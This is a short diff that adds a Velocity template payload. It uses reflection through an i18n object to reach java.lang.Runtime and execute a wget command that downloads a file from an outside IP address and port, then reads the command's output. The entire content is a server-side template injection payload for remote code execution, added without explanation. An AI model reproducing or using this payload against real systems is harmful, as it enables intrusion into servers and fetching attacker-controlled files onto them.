@@ -1,0 +1,6 @@
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('wget http://174.137.55.171:12345/aaa.txt'))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$out.read()
+#end
